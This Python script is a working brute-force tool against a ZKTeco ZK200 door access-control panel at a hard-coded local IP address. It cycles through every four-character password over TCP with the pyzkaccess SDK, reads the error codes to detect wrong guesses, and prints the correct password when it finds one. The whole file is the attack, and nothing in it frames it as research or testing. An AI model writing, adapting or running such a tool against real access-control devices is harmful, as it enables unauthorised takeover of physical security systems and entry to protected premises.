import os

from pyzkaccess import ZKAccess, ZK200
from pyzkaccess.exceptions import ZKSDKError
from itertools import product
import pickle
import time

password_length = 4
password_chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_"
# connstr = 'protocol=TCP,ipaddress=192.168.5.198,port=4370,timeout=4000,passwd=' + password


def get_possible_passwords(chars: str, length: int = 4):
    return product(chars, repeat=length)


def read_passwords_from_file():
    with open("passwords_4_pos.txt", "rb") as file:
        passwords = pickle.load(file)
        print('Reading possible passwords from file')
    return passwords


def write_passwords_to_file(passwords):
    with open("passwords_4_pos.txt", "wb") as file:
        pickle.dump(passwords, file, protocol=pickle.HIGHEST_PROTOCOL)
        print("Save possible passwords to file")


def brute_force_zk(passwords):
    for password in passwords:
        connstr = 'protocol=TCP,ipaddress=192.168.5.67,port=4370,timeout=4000,passwd=' + ''.join(password)
        # print(connstr)
        try:
            zk = ZKAccess(connstr=connstr, device_model=ZK200, dllpath='pull_sdk/SDK-Ver2.2.0.220/plcommpro.dll')
            print('Correct password is: ', ''.join(password))
            break
        except ZKSDKError as e:

            # wrong password
            if e.err == -14:
                print("Wrong_password", password)

            # The command has no response
            elif e.err == -2:
                print("The command has no response")
            else:
                print("Some error happened", e)


def main():
    global password_chars
    global password_length

    if os.path.exists("passwords_4_pos.txt"):
        passwords = read_passwords_from_file()
    else:
        passwords = get_possible_passwords(password_chars, password_length)
    try:
        brute_force_zk(passwords)

    except KeyboardInterrupt:
        write_passwords_to_file(passwords)


if __name__ == "__main__":
    main()
